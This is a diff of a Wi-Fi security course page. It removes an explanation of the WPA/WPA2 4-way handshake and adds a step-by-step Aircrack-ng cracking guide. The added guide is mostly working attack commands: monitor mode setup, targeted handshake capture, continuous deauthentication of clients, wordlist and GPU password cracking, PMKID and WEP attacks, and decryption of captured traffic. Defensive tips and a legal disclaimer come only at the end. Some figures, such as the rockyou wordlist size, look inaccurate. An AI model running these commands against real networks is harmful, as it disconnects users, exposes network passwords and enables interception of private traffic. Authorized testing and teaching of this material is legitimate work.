@@ -1,383 +1,546 @@
-# The 4-Way Handshake in Wi-Fi (WPA/WPA2)
+# Aircrack-ng: The Complete Wi-Fi Cracking Guide
 
-## Overview
+## Introduction to Aircrack-ng
 
-The **4-way handshake** is a critical process in **WPA (Wi-Fi Protected Access)** and **WPA2** networks that establishes a secure connection between a client (e.g., laptop, smartphone) and an access point (AP). It ensures that both devices have the correct encryption keys and can communicate securely.
+Aircrack-ng is a powerful suite of tools used for **Wi-Fi network security assessment**. It includes utilities for:
 
-## Why is the 4-Way Handshake Important?
+- **Capturing** Wi-Fi packets (including WPA/WPA2 handshakes)
+- **Cracking** WEP, WPA-PSK, and WPA2-PSK keys
+- **Performing** deauthentication attacks
+- **Analyzing** network traffic
+- **Injecting** packets to force handshakes
 
-1. **Mutual Authentication** – Confirms that both the client and AP know the Pre-Shared Key (PSK)
-2. **Key Exchange** – Derives unique encryption keys for the session
-3. **Prevents Replay Attacks** – Uses random numbers (nonces) to ensure freshness
-4. **Establishes Trust** – Both parties verify each other before exchanging data
+### What's in the Suite?
 
-## How the 4-Way Handshake Works
+| Tool | Purpose |
+|------|---------|
+| `airmon-ng` | Enable/disable monitor mode on wireless adapter |
+| `airodump-ng` | Capture Wi-Fi packets and identify networks |
+| `aireplay-ng` | Replay captured packets and deauthenticate clients |
+| `aircrack-ng` | Crack WEP and WPA/WPA2 passwords |
+| `airdecap-ng` | Decrypt captured packets if password known |
+| `airbase-ng` | Create fake AP (for advanced attacks) |
+| `airgraph-ng` | Generate graphs from captured data |
 
-### Overview Diagram
+## Prerequisites
 
-```
-┌──────────┐                              ┌──────┐
-│  Client  │                              │  AP  │
-│(Supplicant)                    (Authenticator)
-└────┬─────┘                              └──┬───┘
-     │                                       │
-     │   1. ANonce (Random Number)           │
-     │<──────────────────────────────────────┤
-     │       (AP sends first)                │
-     │                                       │
-     │   2. SNonce + MIC                     │
-     ├──────────────────────────────────────>│
-     │       (Client responds)               │
-     │                                       │
-     │   3. GTK + MIC + Confirmation         │
-     │<──────────────────────────────────────┤
-     │       (AP sends group key)            │
-     │                                       │
-     │   4. ACK (Acknowledgment)             │
-     ├──────────────────────────────────────>│
-     │       (Client confirms)               │
-     │                                       │
-     │  ✓ Secure Connection Established      │
-```
+### Hardware Requirements
+- **Linux system** (Kali Linux recommended)
+- **Wi-Fi adapter** that supports monitor mode
+  - Recommended: TP-LINK TL-WN722N
+  - Other options: Alfa Networks, Atheros chipset, Ralink
+  - RTL8188CUS, Realtek chipsets also supported
+- **Target Wi-Fi network** (WEP/WPA/WPA2)
+- **Wordlist** for password cracking
+  - `/usr/share/wordlists/rockyou.txt` (Kali default)
+  - Or custom wordlists
 
-## Detailed Step-by-Step Process
+### Software Requirements
+- Kali Linux or similar Linux distribution
+- Aircrack-ng suite installed
+- Root access (required for monitor mode)
 
-### Message 1: AP → Client (ANonce)
+### Knowledge Requirements
+- Basic Linux command line
+- Understanding of Wi-Fi concepts
+- Network terminology (BSSID, SSID, channel)
 
-**What Happens:**
-- The AP generates a random number: **ANonce (Authenticator Nonce)**
-- This random number is sent to the client
-- The client uses ANonce + PSK to start deriving the encryption key
+## Step-by-Step Wi-Fi Cracking Process
 
-**Client Side Processing:**
-```
-PSK (Password) + SSID + ANonce + SNonce (will generate) + MAC Addresses
-                ↓
-        PMK (Pairwise Master Key) generated
-                ↓
-        PTK (Pairwise Transient Key) partially computed
-```
+### Step 1: Check and Enable Monitor Mode
 
-**Frame Details:**
-- Frame Type: EAPOL (Extensible Authentication Protocol Over LAN)
-- Nonce: ANonce (random 32-byte value)
-- Replay Counter: 0 (first message)
-- Key Information: Flags set
+Monitor mode allows capturing packets without associating with an AP.
 
----
+**Check current wireless interfaces:**
+```bash
+# List all wireless interfaces
+iwconfig
 
-### Message 2: Client → AP (SNonce + MIC)
-
-**What Happens:**
-- The client generates its own random number: **SNonce (Supplicant Nonce)**
-- The client computes the **MIC (Message Integrity Code)** using the PTK (partially derived)
-- Both ANonce and SNonce are sent to derive the final PTK
-
-**Client Side Calculations:**
-```
-Client generates SNonce (random)
-         ↓
-Computes PTK using:
-  - PSK (shared password)
-  - SSID
-  - ANonce (from AP)
-  - SNonce (just generated)
-  - Client MAC address
-  - AP MAC address
-         ↓
-Computes MIC using PTK to verify message integrity
-         ↓
-Sends SNonce + MIC to AP
+# Output should show wlan0, wlan1, etc.
 ```
 
-**Message Format:**
-```
-┌─────────────────────────────────────┐
-│  EAPOL Key Frame                    │
-├─────────────────────────────────────┤
-│ Frame Type: Key                     │
-│ Replay Counter: 1                   │
-│ Key Nonce: SNonce                   │
-│ RSSC: 0                             │
-│ Key RSC: 0                          │
-│ Key MIC: [MIC Value]                │
-│ Key Data Length: 0                  │
-│ Key Data: (None)                    │
-└─────────────────────────────────────┘
+**Enable monitor mode:**
+```bash
+# Start monitor mode on wlan0
+sudo airmon-ng start wlan0
+
+# Output will show new interface (usually wlan0mon)
+# Example output:
+# Interface       Chipset         Driver
+# wlan0           Atheros AR9271  ath9k_htc - [phy0]
+# (monitor mode enabled on wlan0mon)
 ```
 
-**AP Side Calculations:**
+**Kill interfering processes:**
+```bash
+# Some services may block monitor mode
+sudo airmon-ng check kill
+
+# Stops: NetworkManager, dhcpd, etc.
 ```
-AP now has ANonce + SNonce + PSK + MAC Addresses
-         ↓
-Computes the same PTK
-         ↓
-Verifies MIC using computed PTK
-         ↓
-If MIC matches: Client knows the PSK ✓
-         ↓
-AP proceeds to Message 3
+
+**Verify monitor mode is enabled:**
+```bash
+# Should see "Monitor" mode
+iwconfig wlan0mon
+
+# Output:
+# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.4 GHz
 ```
 
 ---
 
-### Message 3: AP → Client (GTK + MIC)
+### Step 2: Scan for Target Networks
 
-**What Happens:**
-- The AP generates the **GTK (Group Temporal Key)** for multicast/broadcast traffic
-- AP sends GTK encrypted with the PTK
-- Includes a new MIC for verification
+List all nearby Wi-Fi networks to find your target.
 
-**Key Components:**
-```
-PTK Components:
-├─ KCK (Key Confirmation Key) - for MIC
-├─ KEK (Key Encryption Key) - encrypts data
-├─ TK (Temporal Key) - for unicast encryption
+**Basic scan:**
+```bash
+# Scan for all networks
+sudo airodump-ng wlan0mon
 
-GTK:
-├─ Used for multicast/broadcast traffic
-├─ Group Key Index
-├─ Encrypted with KEK
+# Press Ctrl+C to stop
 ```
 
-**Message Format:**
+**Output Columns:**
 ```
-┌─────────────────────────────────────┐
-│  EAPOL Key Frame (Message 3)        │
-├─────────────────────────────────────┤
-│ Frame Type: Key                     │
-│ Key Information:                    │
-│   - Key Type: Group (1) / Unicast   │
-│   - MIC: 1                          │
-│   - Secure: 1                       │
-│   - Error: 0                        │
-│   - Request: 0                      │
-│ Replay Counter: 2                   │
-│ Key Nonce: ANonce                   │
-│ Key RSNX: GTK                       │
-│ Key RSC: Sequence counter           │
-│ Key ID: Group Key Index             │
-│ Key MIC: [MIC of entire frame]      │
-│ Key Data Length: [encrypted GTK]    │
-│ Key Data: [Encrypted GTK]           │
-└─────────────────────────────────────┘
+BSSID             PWR  Beacons  #Data #/s  CH  MB   ENC CIPHER AUTH
+00:1A:2B:3C:4D:5E -42   100     50    0   11  150  WPA2 CCMP   PSK
+
+BSSID: MAC address of the Access Point
+PWR: Signal strength (-30 = strong, -80 = weak)
+Beacons: Management frames sent
+#Data: Data packets captured
+#/s: Packets per second
+CH: Channel number (1-13 for 2.4 GHz)
+MB: Speed capability
+ENC: Encryption type (WEP, WPA, WPA2, WPA3, Open)
+CIPHER: Encryption algorithm (CCMP=AES, TKIP, WEP)
+AUTH: Authentication (PSK, MGT, OPN)
 ```
 
-**AP Sends:**
-- Own ANonce
-- GTK (encrypted with KEK)
-- MIC for verification
-- Replay counter incremented
+**Filtered scan (save BSSID information):**
+```bash
+# Continue scanning and write to file
+sudo airodump-ng -w networks wlan0mon
 
-**Client Side Processing:**
-```
-Receives Message 3
-         ↓
-Verifies MIC using KCK
-         ↓
-If MIC valid: AP is authentic ✓
-         ↓
-Decrypts GTK using KEK
-         ↓
-Installs PTK + GTK for encryption
+# Creates files:
+# networks-01.csv
+# networks-01.kismet.csv
+# networks-01.netxml
 ```
 
 ---
 
-### Message 4: Client → AP (ACK)
+### Step 3: Capture Handshake (WPA/WPA2)
 
-**What Happens:**
-- Client confirms receipt of Message 3
-- Sends an acknowledgment frame
-- Completes the handshake
-- Both sides now have identical keys
+Capture the complete 4-way handshake to crack the password later.
 
-**Message Format:**
-```
-┌─────────────────────────────────────┐
-│  EAPOL Key Frame (Message 4)        │
-├─────────────────────────────────────┤
-│ Frame Type: Key                     │
-│ Key Information:                    │
-│   - Key Type: Group / Unicast       │
-│   - MIC: 1                          │
-│   - Secure: 1                       │
-│   - Install: 0 (already installed)  │
-│ Replay Counter: 3                   │
-│ Key Nonce: 0                        │
-│ Key RSC: 0                          │
-│ Key MIC: [MIC of frame]             │
-│ Key Data Length: 0 (No data)        │
-└─────────────────────────────────────┘
+**Method 1: Passive Capture**
+```bash
+# Capture traffic from specific AP
+sudo airodump-ng -w capture -c 11 --bssid 1E:CF:18:34:0C:D5 wlan0mon
+
+# -w capture: Write to file named "capture"
+# -c 11: Monitor channel 11 (replace with target channel)
+# --bssid: Specific AP to target
+# Leave running and wait for client to connect
 ```
 
-**Final Result:**
-```
-┌─────────────────────────────────────┐
-│  Connection Established             │
-├─────────────────────────────────────┤
-│ Client & AP share:                  │
-│ ✓ PTK (Unicast encryption)          │
-│ ✓ GTK (Multicast encryption)        │
-│ ✓ Same nonces verified              │
-│ ✓ Mutual authentication complete    │
-│ ✓ All data now encrypted            │
-└─────────────────────────────────────┘
+**Method 2: Force Handshake with Deauthentication Attack**
+
+Deauthentication forces clients to reconnect, capturing handshake.
+
+**Terminal 1: Start Capturing**
+```bash
+# Start capture in first terminal
+sudo airodump-ng -w capture -c 11 --bssid 1E:CF:18:34:0C:D5 wlan0mon
+
+# Keep this running
 ```
 
-## Key Components Explained
+**Terminal 2: Perform Deauth Attack**
+```bash
+# In second terminal, send deauth packets
+sudo aireplay-ng --deauth 10 -a 1E:CF:18:34:0C:D5 wlan0mon
 
-### Nonces (Random Numbers)
-
-**ANonce (Authenticator Nonce)**
-- Generated by AP
-- 256-bit random value
-- Used in key derivation
-- Changes for each connection
-
-**SNonce (Supplicant Nonce)**
-- Generated by client
-- 256-bit random value
-- Used in key derivation
-- Proves client knows PSK
-
-### Keys Generated
-
-**PMK (Pairwise Master Key)**
-```
-PMK = PBKDF2-SHA1(PSK, SSID, 4096 iterations, 256 bits)
-- Derived from password
-- Same for all devices on same SSID
-- Stored on AP for faster reconnection
+# --deauth 10: Send 10 deauth packets
+# -a [BSSID]: Target AP MAC address
+# Repeat this command if needed
 ```
 
-**PTK (Pairwise Transient Key)**
-```
-PTK = PRF-SHA256(PMK || "Pairwise key expansion" || 
-                  MIN(MAC_A, MAC_B) || MAX(MAC_A, MAC_B) ||
-                  MIN(ANonce, SNonce) || MAX(ANonce, SNonce))
-                  
-- 384 bits total:
-  ├─ KCK (128 bits) - Key Confirmation Key (MIC)
-  ├─ KEK (128 bits) - Key Encryption Key
-  └─ TK (128 bits) - Temporal Key (actual encryption)
-```
-
-**GTK (Group Transient Key)**
-```
-GTK = Random 256-bit value generated by AP
-- For multicast/broadcast traffic
-- Same for all clients on AP
-- Sent encrypted in Message 3
-- Periodically refreshed
-```
-
-### MIC (Message Integrity Code)
-
-**Purpose:**
-- Ensures message wasn't modified
-- Authenticates sender
-- Computed using KCK (part of PTK)
-
-**Computation:**
-```
-MIC = HMAC-SHA1 or HMAC-SHA256(KCK, EAPOL_Frame)
-```
-
-**Verification:**
-- Receiver computes MIC
-- Compares with received MIC
-- If different: attack detected, frame rejected
-
-## Why the 4-Way Handshake Can Be Attacked
-
-### Vulnerabilities
-
-**1. KRACK Attack (Key Reinstallation Attack)**
-- **Discovered**: 2017 by Mathy Vanhoef and Frank Piessens
-- **How it works**:
-  - Attacker replays Message 3
-  - Forces key reinstallation
-  - Can reset nonce/encryption state
-  - Allows decryption of traffic
-
-- **Prevention**:
-  - Update firmware/OS
-  - WPA3 resistant
-
-**2. Offline Brute-Force Attack**
-- **Process**:
-  ```
-  1. Capture complete 4-way handshake
-  2. Try passwords from wordlist
-  3. Compute PTK for each password
-  4. Verify MIC against captured MIC
-  5. If match: password found ✓
-  ```
-- **Time**: Depends on wordlist size and hardware
-  - Fast wordlist: Minutes
-  - Large wordlist: Hours to days
-
-**3. Weak Passwords**
-- Only 8-character passwords
-- Dictionary words
-- No special characters
-- Easily cracked
-
-**4. PMKID Attack**
-- Capture PMKID from single frame
-- No handshake needed
-- Faster offline attack
-- Requires single beacon frame
-
-## Wireshark Analysis
-
-### Capturing Handshake in Wireshark
-
-```
-Filter: eapol
-
-Observe:
-1. Message 1: Nonce from AP (Key Information bit 7 = 0)
-2. Message 2: Nonce from client (Key Information bit 7 = 1)
-3. Message 3: GTK from AP (MIC present)
-4. Message 4: Client ACK (MIC present)
-```
-
-### Packet Structure
-
-```
-Frame
-├─ Ethernet Header
-├─ IP Header (if logged)
-├─ LLC Header
-└─ EAPOL
-   ├─ EAPOL Header
-   ├─ Key Descriptor Type
-   └─ Key Data Payload
-```
-
-## Protection Mechanisms
-
-### In WPA2
-
-- **Authentication**: PSK verified through MIC
-- **Confidentiality**: PTK for encryption
-- **Integrity**: MIC protects all messages
-- **Freshness**: Nonces prevent replay
-
-### In WPA3
-
-- **SAE (Simultaneous Authentication of Equals)**
-  - Replaces PSK exchange
-  - Protected against offline attacks
-  - Stronger math-based authentication
-
-- **Individualized Data Encryption (OWE)**
-  - Works without password
-  - Still establishes unique keys
+**What You'll See:**
+- Clients disconnect from AP
+- Clients reconnect automatically
+- **Handshake captured!** ✓ (Watch for "[+] WPA handshake: XX:XX:XX:XX:XX:XX")
 
 ---
 
-**Next**: Learn about practical [Aircrack-ng Guide](../06-Aircrack-ng-Guide/README.md)
+### Step 4: Verify Handshake with Wireshark
+
+Verify the captured handshake contains all 4 messages.
+
+**Open capture file in Wireshark:**
+```bash
+# View capture file
+wireshark capture-01.cap &
+
+# Or command line
+tshark -r capture-01.cap -Y eapol
+```
+
+**Filter for EAPOL frames:**
+- In Wireshark: Filter field type `eapol`
+- Look for 4 EAPOL Key frames:
+  1. Message 1: ANonce
+  2. Message 2: SNonce + MIC
+  3. Message 3: GTK + MIC
+  4. Message 4: ACK
+
+**Handshake Complete Indicators:**
+```
+Message 1 -> Frame 1
+Message 2 -> Frame 2 (key_info: 0x0101 or 0x0109)
+Message 3 -> Frame 3 (key_info: 0x13c9 or 0x13cd)
+Message 4 -> Frame 4 (key_info: 0x0300)
+```
+
+---
+
+### Step 5: Stop Monitor Mode
+
+After capturing, disable monitor mode.
+
+```bash
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+
+# Restore normal mode
+iwconfig wlan0
+
+# Restart networking (optional)
+sudo service networking restart
+```
+
+---
+
+### Step 6: Password Cracking with Aircrack-ng
+
+Crack the captured WPA2 password using a wordlist.
+
+**Crack with rockyou.txt:**
+```bash
+# Crack the password
+sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+# -w: Path to wordlist
+# Output will show:
+# [00:00:XX] Tried 50000 keys in X seconds (XX keys/sec)
+# KEY FOUND! [password123]
+```
+
+**Crack with custom wordlist:**
+```bash
+# Use your own wordlist
+sudo aircrack-ng capture-01.cap -w /path/to/wordlist.txt
+
+# Show progress
+sudo aircrack-ng capture-01.cap -w /path/to/wordlist.txt -b 1E:CF:18:34:0C:D5
+```
+
+**Crack with GPU acceleration (faster):**
+```bash
+# Using pyrit with GPU support
+pyrit -r capture-01.cap -b 1E:CF:18:34:0C:D5 attack_db
+
+# Much faster than CPU-only
+```
+
+**Output on Success:**
+```
+[00:05:34] Tried 250000 keys in 324 seconds (771 keys/sec)
+
+                        [+] Master Key Found: 123456789
+
+     0A 1B 2C 3D 4E 5F 6A 7B 8C 9D 0E 1F 2A 3B 4C 5D
+
+       Transient Key : 5A 6B 7C 8D 9E 0F 1A 2B 3C 4D 5E 6F
+
+```
+
+---
+
+## Practical Example
+
+### Scenario
+- Target SSID: "Guest Network"
+- Target BSSID: 1E:CF:18:34:0C:D5
+- Channel: 11
+- Adapter: wlan0
+- Wordlist: /usr/share/wordlists/rockyou.txt
+
+### Complete Commands
+
+**Terminal 1: Enable Monitor and Scan**
+```bash
+# Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Scan for networks
+sudo airodump-ng wlan0mon
+# (Find target, note BSSID, channel, encryption)
+```
+
+**Terminal 1: Start Capture**
+```bash
+# Keep running in background
+sudo airodump-ng -w hack1 -c 11 --bssid 1E:CF:18:34:0C:D5 wlan0mon
+```
+
+**Terminal 2: Deauth Attack**
+```bash
+# Force handshake capture
+sudo aireplay-ng --deauth 0 -a 1E:CF:18:34:0C:D5 wlan0mon
+
+# --deauth 0 = continuous deauth
+# Can modify number if needed
+```
+
+**Wait for Handshake**
+```
+# Watch Terminal 1 for:
+# [+] WPA handshake: 1E:CF:18:34:0C:D5
+```
+
+**Stop Monitor Mode**
+```bash
+# After handshake captured
+sudo airmon-ng stop wlan0mon
+```
+
+**Verify in Wireshark**
+```bash
+wireshark hack1-01.cap &
+
+# Filter: eapol
+# Verify 4 frames present
+```
+
+**Crack Password**
+```bash
+# Crack the WPA2 password
+sudo aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
+
+# Output:
+# KEY FOUND! [123456789]
+```
+
+---
+
+## Advanced Techniques
+
+### PMKID Attack (Faster Handshake Capture)
+
+Capture PMKID from a single beacon frame.
+
+```bash
+# Capture PMKID
+sudo airodump-ng -w pmkid_capture --pmkid wlan0mon
+
+# Faster than waiting for full handshake
+# Only need single beacon frame
+
+# Crack with hashcat or Aircrack-ng
+sudo aircrack-ng pmkid_capture-01.cap -w wordlist.txt
+```
+
+### Creating Wordlists
+
+**Use existing wordlists:**
+```bash
+# Common locations in Kali
+ls /usr/share/wordlists/
+
+# rockyou.txt (14GB uncompressed)
+# Decompress rockyou:
+gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+**Generate custom wordlist:**
+```bash
+# Using crunch
+crunch 8 12 -o wordlist.txt
+# Generates all combinations 8-12 chars
+
+# Using john
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout > rules_wordlist.txt
+
+# Using cewl (website-based)
+cewl https://target-website.com -w wordlist.txt
+```
+
+### Targeting WEP Networks
+
+**WEP is easier to crack (deprecated):**
+
+```bash
+# 1. Capture WEP packets
+sudo airodump-ng -w wep_capture -c 6 --bssid [BSSID] wlan0mon
+
+# 2. Wait for enough packets (10000+)
+# 3. No handshake needed!
+
+# 4. Crack WEP
+sudo aircrack-ng wep_capture-01.cap
+
+# Usually cracks in seconds to minutes
+```
+
+### Decrypting Captured Traffic
+
+**If you crack the password:**
+
+```bash
+# Decrypt captured packets
+airdecap-ng -w 123456789 capture-01.cap -o decrypted.cap
+
+# -w: The cracked password
+# -o: Output file with decrypted packets
+
+# Open decrypted.cap in Wireshark
+wireshark decrypted.cap
+```
+
+---
+
+## Defense and Protection
+
+### Strengthen Your Own Network
+
+**1. Use WPA3**
+```bash
+# Router settings: Use WPA3-Personal
+# If unavailable: WPA2 minimum
+```
+
+**2. Strong Password**
+```bash
+# Requirements:
+# - 16+ characters
+# - Mix of uppercase, lowercase, numbers, symbols
+# - No dictionary words
+# - No personal information
+
+# Example: 7@k#mQ9$vL2!xR5p
+```
+
+**3. Hide SSID**
+```bash
+# Does NOT prevent attacks, but adds obscurity
+# Router settings: Disable SSID broadcast
+```
+
+**4. Change Default Credentials**
+```bash
+# Default router admin passwords vulnerable
+# Access: 192.168.1.1
+# Change default username/password
+```
+
+**5. Update Firmware**
+```bash
+# Keep router firmware updated
+# Patches security vulnerabilities
+# KRACK and other attacks patched
+```
+
+**6. Disable WPS**
+```bash
+# Wi-Fi Protected Setup has vulnerabilities
+# Router settings: Disable WPS
+```
+
+**7. MAC Filtering** (Limited effectiveness)
+```bash
+# Only allow specific device MAC addresses
+# Adds layer of security
+# Can be spoofed but adds friction
+```
+
+---
+
+## Troubleshooting
+
+### Common Issues
+
+**Monitor Mode Won't Enable**
+```bash
+# Issue: Driver not supporting monitor mode
+
+# Solution 1: Kill interfering processes
+sudo airmon-ng check kill
+
+# Solution 2: Use a compatible adapter
+# Check chipset: lsusb or lspci
+
+# Solution 3: Update drivers
+sudo apt update && sudo apt upgrade
+```
+
+**No Handshake Captured**
+```bash
+# Issue: Waiting but no clients connecting
+
+# Solution 1: Extend wait time
+# Solution 2: Use more aggressive deauth
+sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
+
+# Solution 3: Verify capture settings
+# Make sure -c flag has correct channel
+```
+
+**Aircrack-ng Not Finding Password**
+```bash
+# Issue: Password not in wordlist
+
+# Solutions:
+# 1. Use larger wordlist
+# 2. Create custom wordlist
+# 3. Use rainbow tables (faster)
+# 4. Use GPU acceleration
+```
+
+---
+
+## Legal and Ethical Considerations
+
+### ⚠️ IMPORTANT DISCLAIMER
+
+**This guide is for EDUCATIONAL purposes only**
+
+- **Only crack networks you own or have explicit written permission to test**
+- **Unauthorized access to networks is ILLEGAL**
+- **Performing attacks without permission violates:**
+  - Computer Fraud and Abuse Act (CFAA) - USA
+  - Computer Misuse Act - UK
+  - Similar laws in other countries
+
+### Legitimate Uses
+- ✅ Testing your own networks
+- ✅ Authorized penetration testing (with written contract)
+- ✅ Security research
+- ✅ Educational learning in controlled labs
+- ✅ Home network security testing
+
+### What NOT to Do
+- ❌ Crack neighbor's Wi-Fi
+- ❌ Test without written permission
+- ❌ Access systems you don't own
+- ❌ Use skills for malicious purposes
+
+---
+
+**Related Resources:**
+- [The 4-Way Handshake](../05-4-Way-Handshake/README.md) - Technical details
+- [Wi-Fi Security Protocols](../03-WiFi-Security-Protocols/README.md) - Protocol overview
+- Aircrack-ng Official: https://www.aircrack-ng.org/
